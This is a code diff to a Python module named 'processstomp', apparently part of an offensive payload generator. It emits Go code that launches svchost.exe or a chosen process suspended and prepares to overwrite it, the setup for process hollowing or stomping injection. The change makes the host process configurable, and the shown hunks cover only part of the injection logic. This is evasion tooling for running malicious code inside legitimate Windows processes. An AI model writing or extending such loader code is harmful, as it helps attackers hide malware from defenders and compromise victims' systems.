@@ -2,7 +2,9 @@ from string import Template
 
 class processstomp:
     def __init__(self, arguments):
-        pass
+        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+        if 'target' in arguments:
+            self.target = arguments['target'].replace('\\','\\\\')
 
     def imports(self) -> list[str]:
         return ['unsafe',
@@ -16,7 +18,7 @@ class processstomp:
         return """"""
 
     def template(self) -> str:
-        return """
+        return Template("""
     {transformers}
 
 	// Load DLLs and Procedures
@@ -31,7 +33,7 @@ class processstomp:
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}}
-	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("C:\\\\windows\\\\system32\\\\svchost.exe"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
+	windows.CreateProcess(nil, syscall.StringToUTF16Ptr("$target"), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
 
 	type PEB struct {{
 		//reserved1              [2]byte     // BYTE 0-1
@@ -219,4 +221,4 @@ class processstomp:
 	windows.CloseHandle(procInfo.Process)
 
 	windows.CloseHandle(procInfo.Thread)
-"""
+""").substitute(target=self.target)
